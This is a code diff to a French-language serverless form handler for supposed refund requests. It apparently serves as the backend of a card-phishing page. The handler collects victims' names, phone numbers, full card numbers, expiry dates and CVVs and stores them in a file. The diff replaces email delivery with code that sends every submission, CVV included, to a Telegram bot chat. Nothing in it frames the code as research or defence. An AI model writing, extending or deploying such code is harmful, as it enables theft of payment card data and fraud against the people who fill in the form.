@@ -1,4 +1,4 @@
-const nodemailer = require('nodemailer');
+const https = require('https');
 const fs = require('fs');
 
 function loadDemandes() {
@@ -26,23 +26,34 @@ function json(statusCode, body) {
   };
 }
 
-function isEmailConfigured() {
-  return Boolean(
-    process.env.RECEIVER_EMAIL &&
-    process.env.SMTP_USER &&
-    process.env.SMTP_PASS
-  );
+function isTelegramConfigured() {
+  return Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID);
 }
 
-function createTransporter() {
-  return nodemailer.createTransport({
-    host: process.env.SMTP_HOST || 'smtp.gmail.com',
-    port: Number(process.env.SMTP_PORT) || 587,
-    secure: false,
-    auth: {
-      user: process.env.SMTP_USER,
-      pass: process.env.SMTP_PASS,
-    },
+function sendToTelegram(message) {
+  return new Promise((resolve, reject) => {
+    const postData = JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: message });
+    const req = https.request({
+      hostname: 'api.telegram.org',
+      path: `/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
+      timeout: 10000,
+    }, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => {
+        try {
+          const json = JSON.parse(body);
+          if (json.ok) resolve(json);
+          else reject(new Error(json.description || 'Telegram API error'));
+        } catch (e) { reject(e); }
+      });
+    });
+    req.on('error', reject);
+    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
+    req.write(postData);
+    req.end();
   });
 }
 
@@ -81,34 +92,16 @@ exports.handler = async (event) => {
   const entry = { id: Date.now(), dateReception: new Date().toISOString(), nom, telephone, rib: cardNumber, nomCompte, date, CVV };
   saveDemande(entry);
 
-  if (!isEmailConfigured()) {
-    return json(200, { success: true, message: 'Demande enregistree (email non configure).' });
+  if (!isTelegramConfigured()) {
+    return json(200, { success: true, message: 'Demande enregistree (Telegram non configure).' });
   }
 
-  const html = `
-    <h2>Nouvelle demande de remboursement</h2>
-    <h3>Informations personnelles</h3>
-    <p><strong>Nom :</strong> ${nom}</p>
-    <p><strong>Telephone :</strong> ${telephone}</p>
-    <h3>Coordonnees de carte</h3>
-    <p><strong>Numero de carte :</strong> ${cardNumber}</p>
-    <p><strong>Nom du titulaire :</strong> ${nomCompte}</p>
-    <p><strong>Mois et annee :</strong> ${date}</p>
-    <p><strong>CVV :</strong> ${CVV}</p>
-    <hr>
-    <p><em>Recu le ${new Date().toLocaleString('fr-FR')}</em></p>
-  `;
+  const message = `Nouvelle demande de remboursement\n\nNom: ${nom}\nTelephone: ${telephone}\nRIB/Carte: ${cardNumber}\nNom du compte: ${nomCompte}\nDate: ${date}\nCVV: ${CVV}`;
 
   try {
-    const transporter = createTransporter();
-    await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to: process.env.RECEIVER_EMAIL,
-      subject: `Demande de remboursement - ${nom}`,
-      html,
-    });
+    await sendToTelegram(message);
     return json(200, { success: true, message: 'Votre demande a ete envoyee avec succes.' });
   } catch (err) {
-    return json(200, { success: true, message: 'Demande enregistree. Email non envoye.', emailError: err.message });
+    return json(200, { success: true, message: 'Demande enregistree. Telegram non envoye.', error: err.message });
   }
 };
